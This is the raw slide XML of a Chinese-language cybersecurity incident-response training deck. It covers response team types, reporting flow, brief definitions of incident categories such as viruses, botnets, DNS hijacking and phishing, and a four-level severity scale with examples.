            <a:off x="755576" y="76470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应急响应方法</a:t>
            </a:r>
            <a:endParaRPr dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="图示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484784"/>
            <a:ext cx="8568952" cy="4669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31861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DFCE6B-4171-B847-99DD-7683E099AA39}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568"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应急响应上报流程</a:t>
            </a:r>
            <a:endParaRPr dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="31746"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362" y="1628800"/>
            <a:ext cx="7723286" cy="4183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8808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1746"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31746"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="317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428970-B00F-9445-99AE-0672363D5DEA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="654051" y="819127"/>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应急响应小组分类</a:t>
            </a:r>
            <a:endParaRPr dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32770" name="TextBox 5"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="628401" y="1772816"/>
            <a:ext cx="797341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2000" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>应急响应小组可以按照多种方式进行分类。普遍的分类方式是根据网络安全应急小组的主要目的、功能或服务进行分类。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图示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537" y="2852936"/>
            <a:ext cx="7616899" cy="2598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96792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2770"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="32770"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="0-#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3277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9D84EB-4714-D34E-88BC-E956BCE48452}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="539552"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国家级网络安全应急响应组织</a:t>
            </a:r>
            <a:endParaRPr dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
            </a:endParaRPr>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700808"/>
            <a:ext cx="8280920" cy="4325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29766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barn(outVertical)">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="34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51720" y="2996952"/>
            <a:ext cx="5184576" cy="4873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altLang="zh-CN" sz="3600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>事件的分级分类</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1310661981"/>
      </p:ext>
    </p:extLst>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6DDBB5-FF0B-3742-8A80-862F853C0369}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568" y="76470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事件分类</a:t>
            </a:r>
            <a:endParaRPr dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37890" name="矩形 2"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="395536" y="1484784"/>
            <a:ext cx="8496944" cy="4362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计算机病毒事件</a:t>
            </a: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病毒指“编制者在计算机程序中插入的破坏计算机功能或者破坏数据，影响计算机使用并且能够自我复制的一组计算机指令或者程序代码。</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蠕虫事件</a:t>
            </a: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指网络蠕虫，其表现形式为，内外网主机遭受恶意代码破坏或从外网发起对网络的蠕虫感染。</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木马事件</a:t>
            </a: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是指通过特定的程序（木马程序）来控制另一台计算机。木马通常有两个可执行程序：一个是控制端，另一个是被控制端。</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僵尸网络事件</a:t>
            </a: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是指采用一种或多种传播手段，将大量主机感染</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"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bot</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程序（僵尸程序）病毒，从而在控制者和被感染主机之间所形成的一个可一对多控制的网络。</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域名劫持事件</a:t>
            </a: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是指通过攻击域名解析服务器（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"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DNS</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），或伪造域名解析服务器（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"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DNS</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）的方法，把目标网站域名解析到错误的地址从而实现用户无法访问目标网站的目的。</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网络仿冒事件</a:t>
            </a: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是指不法分子在互联网上仿冒知名的电子交易站点（如银行或拍卖网站）的网页，诱使用户访问假站点，骗取用户的账号和密码等信息，从而窃取钱财。</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网页篡改事件</a:t>
            </a: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是指攻击者已经获取了网站的控制权限，将网页篡改为非本网站的页面。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="15153087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additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="37890"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="378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AA0F3-4680-1C48-BF0D-C7FB4A150081}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568" y="76470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事件分类</a:t>
            </a:r>
            <a:endParaRPr dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39938" name="矩形 2"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="539552" y="1556792"/>
            <a:ext cx="8388647" cy="4285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网页挂马事件：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是指攻击者已经获取了网站的控制权限，在网站上插入恶意代码，以实现针对所有访问者进行木马攻击事件。</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拒绝服务攻击事件：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拒绝服务攻击即攻击者想办法让目标机器停止提供服务，是黑客常用的攻击手段之一。</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后门漏洞事件：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是指攻击者已经获取了网站或服务器权限，为实现长久控制的目的，在网站或服务器上留下可再次进入的后门程序。</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非授权访问事件：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没有预先经过同意，就使用网络或计算机资源，如有意避开系统访问控制机制，对网络设备及资源进行非正常使用，或擅自扩大权限，越权访问信息。它主要有以下几种形式：假冒、身份攻击、非法用户进入网络系统进行违法操作、合法用户以未授权方式进行操作等。</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垃圾邮件事件：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是指未经用户许可（与用户无关）就强行发送到用户的邮箱中的任何电子邮件。</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其他网络安全事件：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其它未在上述定义的网络安全事件。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4214420435"/>
      </p:ext>
    </p:extLst>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C9DCC-3D92-F14B-9698-949CA976AC91}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="723900"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事件分级参考</a:t>
            </a:r>
            <a:endParaRPr dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6519FF81-91E5-DB48-B2AC-46EBA7DBFDA5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="723900" y="1689065"/>
            <a:ext cx="7664524" cy="1892826"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">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400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>四级/一般</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>安全事件未造成业务中断，或中断时间少于10分钟，并且未造成业务系统数据损坏、丢失。例如，误操作加入了一项访问控制列表，造成业务系统暂时无法访问，及时发现并进行了恢复。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="矩形 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{54ED7F80-AC4B-FC4E-837C-6120FB599CDD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="723900" y="3580210"/>
            <a:ext cx="7664524" cy="1892826"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>三级/较大</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>安全事件造成业务中断或间断，中断时间10-30分钟，并且未造成业务系统数据损坏、丢失。例如，蠕虫病毒造成局部网络拥塞，未对数据破坏，及时进行了防毒与恢复。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="38050368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AA01E9-AE7A-FA4E-85F2-5B83BA646A1A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611560" y="69269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事件分级参考</a:t>
            </a:r>
            <a:endParaRPr dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FE1ECBF1-6664-0143-ADF2-C3A19E68EC5F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="759962" y="1309495"/>
            <a:ext cx="8060510" cy="1800493"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">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000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>二级/重大</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>安全事件造成业务中断或间断时间在30-60分钟，或者业务系统数据部分损坏、丢失，可以通过备份进行恢复。例如，某服务器被入侵后，系统数据被删除，被删除数据有备份。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="矩形 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{67316553-E506-0043-BA27-4F12BE663088}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="790575" y="3063821"/>
            <a:ext cx="8029897" cy="1800493"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">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000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>一级/特别重大</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>安全事件造成业务中断或间断时间在60分钟以上，或者业务系统数据损坏、丢失，并且无法恢复，或者重要数据泄露，或者业务系统或网络被破坏或损坏，并且预计在60分钟内无法恢复。安全事件造成一级敏感数据泄漏。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="矩形 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="756952" y="4886616"/>
            <a:ext cx="8029896" cy="965842"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>特殊时期（如重大活动、重大赛事等）发生的安全事件的级别应在原有级别上提升一级，特别重大安全事件级别不再向上提升</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="40283342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bwMode="gray">
          <a:xfrm>
            <a:off x="2267744" y="2564904"/>
            <a:ext cx="4824536" cy="48736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defRPr sz="3600" b="1">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr eaLnBrk="0" hangingPunct="0">
              <a:defRPr sz="3200" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr eaLnBrk="0" hangingPunct="0">
              <a:defRPr sz="3200" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr eaLnBrk="0" hangingPunct="0">
              <a:defRPr sz="3200" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr eaLnBrk="0" hangingPunct="0">
              <a:defRPr sz="3200" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="457200" fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr sz="3200" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="914400" fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr sz="3200" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="1371600" fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr sz="3200" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="1828800" fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr sz="3200" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>3.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>应急响应工作流程</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3482092945"/>
      </p:ext>
    </p:extLst>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BC4F90-C02E-9D48-A4A4-2A407B0D93B8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="899592"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应急流程</a:t>
            </a:r>
            <a:endParaRPr dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="图示 2"/>
          <p:cNvPicPr>
            <a:picLocks noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:extLst>
              <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
              </a:ext>
            </a:extLst>
          </a:blip>
          <a:srcRect l="21507" t="15384" r="21913" b="6632"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1331640" y="1484784"/>
            <a:ext cx="6768752" cy="4680519"/>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139EC136-492B-0F4B-8BDB-9EDB4BB67D5C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3510017" y="5668995"/>
            <a:ext cx="646331" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
